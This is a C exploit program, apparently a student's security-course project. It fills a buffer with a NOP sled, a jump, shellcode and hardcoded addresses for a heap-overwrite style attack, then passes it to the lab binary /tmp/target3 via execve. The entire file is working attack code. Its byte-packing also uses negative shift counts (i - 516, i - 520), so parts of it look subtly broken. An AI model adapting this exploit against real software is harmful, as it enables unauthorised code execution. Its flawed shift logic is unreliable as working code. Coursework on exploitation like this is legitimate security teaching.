/**
CS6332.501
Project 5
Submitted by Konchady Gaurav Shenoy (kxs168430)
**/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

int main(void)
{
  char *args[3];
  char *env[1];

  char exploit_buffer[1024];
  int i;
  int decoy, lpadd, rpadd;

  lpadd = 0x8049c08;
  rpadd = 0xbffffa9c;
  decoy = rpadd+1;

  //Buffer set up.
  //Shifting code with if-else conditions sourced from class slides and text.
  for (i=0; i<1024; i++) {
     if (i < 2) {
        *(exploit_buffer + i) = '\x90';
     } else if (i < 4) {
        memcpy((exploit_buffer+i), "\xeb\x03", 2);
        i++;
     } else if (i < 8) {
        *(exploit_buffer + i) = decoy >> ((i-4) * 8);
     } else if (i < (512 - strlen(shellcode))) {
        *(exploit_buffer + i) = '\x90';
     } else if (i < 512) {
        *(exploit_buffer + i) = shellcode[i - 512 + strlen(shellcode)];
     } else if (i < 516) {
        *(exploit_buffer + i) = lpadd >> ((i - 516) * 8);
     } else if (i < 520) {
        *(exploit_buffer + i) = rpadd >> ((i - 520) * 8);
     } else if (i < 1023) {
        *(exploit_buffer + i) = '\x90';
     } else {
        *(exploit_buffer + i) = '\x00';
     }
  }

  args[0] = TARGET; args[1] = exploit_buffer; args[2] = env[0] = NULL;

  //The Moment of Truth
  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
